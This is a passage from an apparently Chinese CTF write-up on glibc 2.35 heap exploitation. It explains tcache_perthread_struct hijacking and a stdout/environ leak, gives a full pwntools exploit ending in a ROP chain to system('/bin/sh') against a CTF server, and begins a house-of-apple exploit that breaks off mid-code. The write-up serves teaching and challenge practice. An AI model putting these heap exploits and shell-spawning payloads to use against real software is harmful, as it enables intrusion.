+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS		64</span><br><br><span class="hljs-comment">// glibc-2.30之前</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-comment">//glibc-2.30及以后</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">uint16_t</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br></code></pre></td></tr></table></figure>
+
+<p>根据这个结构体，可以计算出0xf0大小的tcache块位于堆基址的偏移</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">word_bytes = context.word_size // <span class="hljs-number">8</span> <span class="hljs-comment"># i386-&gt;word_size=32  amd64-&gt;word_size=64</span><br>target = <span class="hljs-number">0xf0</span><br><br><span class="hljs-comment"># glibc-2.30之前</span><br>offset = <span class="hljs-number">0x10</span> + <span class="hljs-number">0x40</span> + (target-<span class="hljs-number">0x20</span>)//<span class="hljs-number">0x10</span> * word_bytes<br><br><span class="hljs-comment"># glibc-2.30及以后</span><br>offset = <span class="hljs-number">0x10</span> + <span class="hljs-number">0x80</span> + (target-<span class="hljs-number">0x20</span>)//<span class="hljs-number">0x10</span> * word_bytes<br></code></pre></td></tr></table></figure>
+<p>本题是glibc-2.35，利用第二个公式，计算出offset为0xf8<br>我们将<code>heap_base + 0xf8</code>这里的值覆盖为<code>heap_base + 0x10</code><br>当我们申请0xe0大小的空间时(利用解包过程中会申请与content大小相同的空间)，便会申请到<code>heap_base+0x10</code>开始的写权限<br>即可劫持<code>tcache_perthread_struct</code>，实现堆任意分配</p>
+<p>看看我们改之后的<code>tcache_perthread_struct</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 伪造counts</span><br>payload  = p16(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p16(<span class="hljs-number">1</span>)+p16(<span class="hljs-number">1</span>)+p16(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p16(<span class="hljs-number">1</span>)<br>payload  = payload.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><span class="hljs-comment"># 伪造entrtes</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(stdout)+p64(stdout)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(heap_base+<span class="hljs-number">0x10</span>)<br>payload  = payload.ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p>我们将0x40,0x50,0xb0的counts修改为1<br>并将对应的0x40,0x50大小的entries改为stdout结构体的位置<br>将对应0xb0大小的堆块改为<code>heap_base+0x10</code>，以便继续控制<code>tcache_perthread_struct</code><br>最后调整为0xe0，在解包过程中，会申请0xf0大小的chunk，也就是<code>tcache_perthread_struct</code>，然后将content填进去，也就实现了篡改<code>tcache_perthread_struct</code></p>
+<h3 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;		<span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;	<span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;	<span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;	<span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base;	<span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;	<span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;	<span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;	<span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;	<span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br></code></pre></td></tr></table></figure>
+<p>我们将stdout修改成这样</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload2 = p64(<span class="hljs-number">0xFBAD1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(environ)+p64(environ+<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure>
+<p>0xFBAD1800是_IO_MAGIC，由libc定义，大部分都是这个值<br>我们将_IO_write_base修改为environ，将_IO_write_ptr改为environ+8<br>之后便会泄露environ的值</p>
+<h3 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h3><p>environ是个由libc定义的全局变量，定义为<code>char **environ</code>，用于存放程序的环境变量<br>而它存放的指针通常是栈上的，所以可以利用它来泄露栈上的值</p>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> heybro_pb2<br><br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="hljs-number">28127</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>remote_libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>local_libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>libc = remote_libc<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">idx,content</span>):<br>    data = heybro_pb2.heybro()<br>    data.whattodo = <span class="hljs-number">1</span><br>    data.whatcon = content<br>    data.whatidx = idx<br>    data.whatsize = <span class="hljs-number">0</span><br>    data.whatsthis = <span class="hljs-number">0</span><br>    data = data.SerializeToString()<br>    p.recvuntil(<span class="hljs-string">b&#x27;WANT?\n&#x27;</span>)<br>    p.send(data)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    data = heybro_pb2.heybro()<br>    data.whattodo = <span class="hljs-number">2</span><br>    data.whatcon = <span class="hljs-string">b&#x27;0&#x27;</span><br>    data.whatidx = idx<br>    data.whatsize = <span class="hljs-number">1</span><br>    data.whatsthis = <span class="hljs-number">1</span><br>    data = data.SerializeToString()<br>    p.recvuntil(<span class="hljs-string">b&#x27;WANT?\n&#x27;</span>)<br>    p.send(data)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    data = heybro_pb2.heybro()<br>    data.whattodo = <span class="hljs-number">3</span><br>    data.whatcon = <span class="hljs-string">b&#x27;0&#x27;</span><br>    data.whatidx = idx<br>    data.whatsize = <span class="hljs-number">1</span><br>    data.whatsthis = <span class="hljs-number">1</span><br>    data = data.SerializeToString()<br>    p.recvuntil(<span class="hljs-string">b&#x27;WANT?\n&#x27;</span>)<br>    p.send(data)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_nothing</span>(<span class="hljs-params">content</span>):<br>    data = heybro_pb2.heybro()<br>    data.whattodo = <span class="hljs-number">0</span><br>    data.whatcon = content<br>    data.whatidx = <span class="hljs-number">1</span><br>    data.whatsize = <span class="hljs-number">1</span><br>    data.whatsthis = <span class="hljs-number">1</span><br>    data = data.SerializeToString()<br>    p.recvuntil(<span class="hljs-string">b&#x27;WANT?\n&#x27;</span>)<br>    p.send(data)    <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    create(i,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br><br><span class="hljs-comment"># leak libc_base</span><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leak - <span class="hljs-number">0x21ace0</span><br>log.success(<span class="hljs-string">&#x27;libc_base : &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-comment"># leak heap_base</span><br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Content:&#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_base = (leak &lt;&lt; <span class="hljs-number">12</span>) - <span class="hljs-number">0x2000</span> <br>log.success(<span class="hljs-string">&#x27;heap_addr : &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br><span class="hljs-comment"># fill 0x40 tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    delete(i+<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># double free fastbin</span><br>delete(<span class="hljs-number">7</span>)<br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">7</span>)<br><br><span class="hljs-comment"># malloc all tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    create(i,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br><br>environ = libc_base + libc.sym[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>stdout = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br><br>create(<span class="hljs-number">7</span>,p64((heap_base+<span class="hljs-number">0xf0</span>)^((heap_base+<span class="hljs-number">0x004e40</span>)&gt;&gt;<span class="hljs-number">12</span>)))<br>create(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;aaaaaa&#x27;</span>)<br>create(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-comment"># 将0xf0大小的tcache块(entries指针地址在heap_base+0xf8)的entries改为heap_base+0x10</span><br>create(<span class="hljs-number">8</span>,p64(<span class="hljs-number">0</span>) + p64(heap_base+<span class="hljs-number">0x10</span>))<br><br><span class="hljs-comment"># 解包过程中会申请0xe0的空间存放content，也就是说会申请0xf0大小的chunk，由于我们已经将0xf0大小的chunk的entries指针改为heap_base+0x10</span><br><span class="hljs-comment"># 所以我们实际上申请到了heap_base位置的chunk，即tcache_perthread_struct</span><br><span class="hljs-comment"># 伪造counts</span><br>payload  = p16(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p16(<span class="hljs-number">1</span>)+p16(<span class="hljs-number">1</span>)+p16(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p16(<span class="hljs-number">1</span>)<br>payload  = payload.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><span class="hljs-comment"># 伪造entrtes</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(stdout)+p64(stdout)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(heap_base+<span class="hljs-number">0x10</span>)<br>payload  = payload.ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br>do_nothing(payload)<br><br><span class="hljs-comment"># leak stack_addr</span><br>payload2 = p64(<span class="hljs-number">0xFBAD1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(environ)+p64(environ+<span class="hljs-number">8</span>)<br>do_nothing(payload2) <br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>stack_addr = leak - <span class="hljs-number">0x1a8</span> + <span class="hljs-number">0x40</span><br>log.success(<span class="hljs-string">&quot;stack_addr : &quot;</span> + <span class="hljs-built_in">hex</span>(stack_addr))<br><br><span class="hljs-comment"># 伪造counts</span><br>payload3  = p16(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p16(<span class="hljs-number">1</span>)<br>payload3  = payload3.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><span class="hljs-comment"># 伪造entrtes</span><br>payload3 += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(stack_addr)<br>payload3  = payload3.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br>do_nothing(payload3)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>pop_rdi = <span class="hljs-number">0x2a3e5</span> + libc_base<br>system = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + libc_base<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)) + libc_base<br>ret = <span class="hljs-number">0x2a3e6</span> + libc_base<br>payload = cyclic(<span class="hljs-number">8</span>) + p64(ret) +  p64(pop_rdi) + p64(binsh) + p64(system)<br>payload = payload.ljust(<span class="hljs-number">0x58</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>do_nothing(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>有堆溢出漏洞，正常打house of apple</p>
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./EzHeap&quot;</span>)<br><br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&quot;./EzHeap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice &gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;size:&quot;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&quot;content:&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice &gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice &gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&quot;size:&quot;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&quot;content:&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice &gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exit</span>():<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice &gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x490</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x1a0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x480</span>,<span class="hljs-string">b&#x27;b&#x27;</span>) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;c&#x27;</span>) <span class="hljs-comment"># 4</span><br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;g&#x27;</span>) <span class="hljs-comment"># 1</span><br>delete(<span class="hljs-number">3</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span>)<br>libc_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = libc_addr - <span class="hljs-number">0x21b0f0</span><br>log.success(<span class="hljs-string">&quot;libc_base ==&gt;&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_base = heap_addr - <span class="hljs-number">0x002510</span><br>log.success(<span class="hljs-string">&quot;heap_base ==&gt;&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4a1</span>) + p64(libc_addr)*<span class="hljs-number">2</span> + p64(heap_addr) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>] - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;g&#x27;</span>) <span class="hljs-comment"># 5</span><br><br>fake_IO_FILE = heap_base + <span class="hljs-number">0x002b60</span><br>shellcode = <span 